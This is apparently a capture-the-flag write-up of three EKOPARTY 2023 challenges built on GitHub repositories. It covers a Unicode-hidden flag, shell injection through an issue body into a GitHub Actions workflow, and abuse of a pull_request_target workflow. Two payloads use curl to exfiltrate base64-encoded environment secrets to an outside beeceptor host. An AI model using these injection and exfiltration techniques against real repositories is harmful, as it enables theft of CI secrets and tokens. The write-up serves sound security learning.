---
title: EKOPARTY 2023 - Github Repo
date: Fri Nov  3 08:26:38 PM +04 2023
categories: [Writeup]
tags: [ctf,ekoparty,ekoparty2023,github,pwn]
---

## Lobby

### Description

![lobby-1](/assets/images/ekoparty/2023/lobby-1.png)

[The-Lobby](https://github.com/OctoHigh/The-Lobby)

### Solution

If you visit the given URL you'll be see a `README.md`

If you give it a quick read you'll notice some wierd symbols in the text.

I highlighted some:

![lobby-2](/assets/images/ekoparty/2023/lobby-2.png)

```py
➜ py
Python 3.9.5 (tags/v3.9.5:0a7dcbd, May  3 2021, 17:27:52) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> s='''OcτoHigh, tʜe fictional high school nestlêd in the heart of a vibrant and picturesque town, ʜas long held the title of the best high school Ꭵn the country, and its reputation is well-ժeserved. What sets OctoHigh apart is its unwavering commitment to fostering both academic excellence and personal growth. The school boasts a faculty of ժistinguished educators who not only impart knowledge but also inspire and mentor their students. With small class sizes, personalized attention, and a wide array of advanced courses, OctoHigh consistently ranks at the top in national academic competitions and college admissions.
...
... Beyond academics, OctoHigh takes pride in its divěrse and inclusive community. Students from all backgrounds come together to create a tapestry of cultures and experieɴces, fostering a sense of unity and understanding that extends beyond the classroom. This rich environment encourages students to explore their interests, whether in the arts, sports, or community service. Ϝacilities at the school are state-of-the-art incᏞuding a top-tier performing arts center, a championship-level sports complex, and a community garden, provide the perfect setting for students to thrive in their chosen pursuits.
...
... What truly makes OctoHigh stand out is its commitment to charɑcter development. The school's comprehensive character education program helps students grow into well-rounded individuals who value integrity, empathy, and social responsibility. ɢraduates of OctoHigh are not just academᎥcally accomplished; they are also compassionate and responᏚible citizens who are well-prepared to make a positive impact on the world. It's no wonder that OctoᎻigh continues to bė celebrated as the best high school in the countᚱy, as it combines academic excěllence, inclusivity, and character development to provide students with the tools they need to succeed in both their academic and personal lives.
...
... Also, they have the top rated CTF team in the world!'''
>>> for c in s:
...     if ord(c) > 255: # If Not Ascii
...         print(c, end='')
...
τʜêʜᎥժժěɴϜᏞɑɢᎥᏚᎻėᚱě>>>
```

> Flag: EKO{thehiddenflagishere}
{: .prompt-tip }


## Comments

### Description

![comments-1](/assets/images/ekoparty/2023/comments-1.png)

### Solution

As mentioned in github repo you should navigate to `Issues` and sign up by commenting `/join`. 

![comments-2](/assets/images/ekoparty/2023/comments-2.png)

After signing up CI/CD step is going to start and create repos:

```yaml
<snip>

console.log('%s showed up to class!', process.env.LOGIN);
console.log('Creating player repos ...');
await github.rest.repos.createUsingTemplate({
    template_owner: 'OctoHigh',
    template_repo: 'challenge-1',
    name: `challenge-1-${process.env.LOGIN}`,
    owner: 'OctoHigh',
    private: false
});

<snip>

await github.rest.repos.createUsingTemplate({
    template_owner: 'OctoHigh',
    template_repo: 'challenge-2',
    name: `challenge-2-${process.env.LOGIN}`,
    owner: 'OctoHigh',
    private: false
});

<snip>
```

Navigate to your repo in `OctoHigh` account, `https://github.com/OctoHigh/challenge-1-{Your Github Handle}`.

> You'll also recieve an email about joining
{: .prompt-info }

![comments-3](/assets/images/ekoparty/2023/comments-3.png)

Workflow:
```yaml
name: Parse review of teacher

on:
  issues:
    types: [opened, edited]

jobs:
  parse-review:
    runs-on: ubuntu-latest
    steps:
      - name: Extract Teacher name and review from issue body
        id: extract-review
        env: 
          db_pass: ${{ secrets.FLAG }} # Do we still need this to write to the DB?
        run: |
          TEACHER=$(echo '${{ github.event.issue.body }}' | grep -oP 'Teacher:.*$')
          REVIEW=$(echo '${{ github.event.issue.body }}' | grep -vP 'Teacher:.*$')
          echo "::set-output name=teacher::$TEACHER"
          echo "::set-output name=review::$REVIEW"
      - name: Comment on issue
        uses: actions/github-script@v5
        with:
          github-token: ${{secrets.GITHUB_TOKEN}}
          script: |
            const issueComment = {
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: ${{ github.event.issue.number }},
              body: `Thank you for reviewing ${'{{ steps.extract-review.outputs.teacher }}'}! Your review was: 
              ${'{{ steps.extract-review.outputs.review }}'}`
            };
            github.rest.issues.createComment(issueComment);
```

The exploit in the yaml is shell command. If you take a look at `TEACHER=$(echo '${{ github.event.issue.body }}' | grep -oP 'Teacher:.*$')` there's no way to exploit it, because for some command to execute bash needs `"` (double quotes), nothing will happen in single quotes. Since there's no validation we can just escape single quotes `'`, add command, close the quote. 

TLDR; sandwich the bash command into Issue Template.

![comments-4](/assets/images/ekoparty/2023/comments-4.png)

Payload: 

```
Teacher:' $(curl "https://uwuos.free.beeceptor.com/?flag=$(env|grep -i EKO|base64)") '
```

Response on beeceptor:

```
GET /?flag=ZGJfcGFzcz1FS097bTB2ZV95MHVSX2IwZHl9Cg==
```

```
└─$ echo -n 'ZGJfcGFzcz1FS097bTB2ZV95MHVSX2IwZHl9Cg==' | base64 -d
db_pass=EKO{m0ve_y0uR_b0dy}
```

> Flag: EKO{m0ve_y0uR_b0dy}
{: .prompt-tip }


## Fork Knife

### Description

![fork-knife-1](/assets/images/ekoparty/2023/fork-knife-1.png)

![fork-knife-2](/assets/images/ekoparty/2023/fork-knife-2.png)

### Sources

{::options parse_block_html="true" /}

<details><summary markdown="span">grade.yaml</summary>

```yaml
on:
  pull_request_target

jobs:
  build:
    name: Grade the test
    runs-on: ubuntu-latest
    steps:

    - uses: actions/checkout@v2
      with:
        ref: ${{ github.event.pull_request.head.sha }}
        
    - name: Run build & tests
      id: build_and_test
      env: 
        EXPECTED_OUTPUT: ${{ secrets.FLAG }}
      run: |
        /bin/bash ./build.sh > output.txt && /bin/bash ./test.sh

    - uses: actions/github-script@v3
      with:
        github-token: ${{secrets.GITHUB_TOKEN}}
        script: |
          github.issues.createComment({
            issue_number: context.issue.number,
            owner: context.repo.owner,
            repo: context.repo.repo,
            body: "👋 Your code looks great, good job! You've passed the exam!"
          })
```
</details>

<details><summary markdown="span">build.sh</summary>

```sh
#!/bin/bash

# Compile the C++ program
g++ -o submission submission.c

# Check if the compilation was successful
if [ $? -eq 0 ]; then
    echo "Build successful. The program has been compiled as 'submission'."
else
    echo "Build failed. Please check the compilation errors."
fi
```

</details>

<details><summary markdown="span">test.sh</summary>

```sh
#!/bin/bash

# Define the expected output from the environment variable
EXPECTED_OUTPUT="$EXPECTED_OUTPUT"

# Read the content of the output.txt file
if [ -f "output.txt" ]; then
    ACTUAL_OUTPUT=$(cat "output.txt")
else
    echo "Error: 'output.txt' file not found."
    exit 1
fi

# Compare the expected output with the actual output
if [ "$EXPECTED_OUTPUT" = "$ACTUAL_OUTPUT" ]; then
    echo "Validation passed: The content of 'output.txt' matches the expected output."
    exit 0
else
    echo "Validation failed: The content of 'output.txt' does not match the expected output."
    exit 1
fi
```

</details>

{::options parse_block_html="false" /}

### Solution
 
I modified `build.sh` and `submission.c` with following changes:

![fork-knife-3](/assets/images/ekoparty/2023/fork-knife-3.png)

![fork-knife-4](/assets/images/ekoparty/2023/fork-knife-4.png)

Not the most efficient way to do it, but works D:

Payload:

```c
system("curl https://uwuos.free.beeceptor.com/?flag=`env|grep -i EKO|base64`");
```

> Flag: EKO{pr3v3nt_PWN_r3qu3stS}
{: .prompt-tip }
